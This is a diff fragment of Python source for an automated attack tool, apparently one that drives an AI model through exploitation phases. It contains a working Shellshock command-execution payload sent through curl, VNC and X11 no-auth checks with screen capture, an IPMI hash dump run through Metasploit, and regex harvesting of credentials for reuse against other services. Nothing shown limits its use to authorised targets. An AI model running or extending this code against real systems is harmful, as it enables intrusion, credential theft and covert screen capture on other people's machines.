+                    f"R=$(curl -s --max-time 8 -A '() {{ :; }}; echo; echo SHELLSHOCK_RCE; id' "
+                    f"'http://{target}:{port_num}$cgi' 2>/dev/null | grep 'SHELLSHOCK_RCE\\|uid='); "
+                    f"[ -n \"$R\" ] && echo \"SHELLSHOCK_RCE: $cgi — $R\" && break; done",
+                    target, timeout=40,
+                )
+                self._capture_evidence(out, target, f"shellshock-{port_num}", "shellshock cgi")
+                if "SHELLSHOCK_RCE" in out:
+                    accumulated_output.append(f"=== Shellshock ===\n{out[:500]}")
+
+            # ── VNC no-auth ───────────────────────────────────────────────
+            if port_num in (5900, 5901, 5902) or "vnc" in svc:
+                out, _ = self._run_cmd(
+                    "vnc-noauth",
+                    f"nmap -p {port_num} --script vnc-info {target} 2>/dev/null | grep -i 'Authentication\\|None\\|security type'",
+                    target, timeout=20,
+                )
+                if "none" in out.lower() or "no authentication" in out.lower():
+                    self._log(f"[Claude] VNC sin auth en {target}:{port_num}!")
+                    self._save_findings([{
+                        "title": f"VNC Sin Autenticación @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": "VNC accesible sin contraseña — acceso total al escritorio",
+                        "cve": "",
+                    }], target)
+                accumulated_output.append(f"=== VNC ===\n{out[:300]}")
+
+            # ── X11 expuesto ──────────────────────────────────────────────
+            if port_num == 6000 or "x11" in svc:
+                out, _ = self._run_cmd(
+                    "x11-open",
+                    f"timeout 5 xdpyinfo -display {target}:0 2>/dev/null | head -10 && echo X11_OPEN || true",
+                    target, timeout=10,
+                )
+                if "X11_OPEN" in out or "screen" in out.lower():
+                    self._log(f"[Claude] X11 abierto en {target} → capturando pantalla!")
+                    self._save_findings([{
+                        "title": f"X11 Display Expuesto @ {target}:6000",
+                        "severity": "critical",
+                        "description": "X11 accesible sin control de acceso — xwd permite captura de pantalla",
+                        "cve": "",
+                    }], target)
+
+            # ── IPMI hash dump ────────────────────────────────────────────
+            if port_num == 623 or "ipmi" in svc:
+                out, _ = self._run_cmd(
+                    "ipmi-hashump",
+                    f"msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; "
+                    f"set RHOSTS {target}; run; exit' 2>/dev/null | grep -E 'IPMI|hash|admin|password' | head -10",
+                    target, timeout=40,
+                )
+                accumulated_output.append(f"=== IPMI ===\n{out[:400]}")
+                if out.strip():
+                    self._capture_evidence(out, target, "ipmi-dumphashes", "ipmi_dumphashes")
+
             # ── Anonymous FTP → grab everything useful ───────────────────
             if port_num == 21 or "ftp" in svc:
                 out, _ = self._run_cmd(
@@ -7001,6 +7515,24 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
         # ── FASE 4: Enumeración específica por servicio ───────────────────
         self._log(f"[Claude] Fase 4/5: Enumeración específica por servicio")
         self._run_kb_phase(target, open_ports, accumulated_output)
+
+        # ── FASE 4b: Credential chaining con todo lo encontrado ─────────
+        all_creds_so_far = re.findall(
+            r'(?:230 Login|TOMCAT_CREDS_VALID|valid.*cred|Hydra.*login:|'
+            r'\[\+\].*[Ss]uccess)[:\s]+(\w[\w\-\.]+:\S+)',
+            "\n".join(accumulated_output),
+            re.IGNORECASE,
+        )
+        # Also extract username:password patterns from tool outputs
+        all_creds_so_far += re.findall(
+            r'(?:username|user|login)[:\s]+(\w+)\s*[\n|].*?(?:password|pass)[:\s]+(\S+)',
+            "\n".join(accumulated_output[-8:]),
+            re.IGNORECASE | re.DOTALL,
+        )
+        flat_all = [f"{c[0]}:{c[1]}" if isinstance(c, tuple) else c for c in all_creds_so_far]
+        if flat_all:
+            self._log(f"[Claude] Fase 4b: Credential chaining — {len(flat_all)} credencial(es)")
+            self._credential_chain(target, open_ports, flat_all, accumulated_output)
 
         # ── FASE 5: Bucle Claude AI — análisis + explotación avanzada ─────
         self._log(f"[Claude] Fase 5/5: Análisis IA y explotación avanzada")
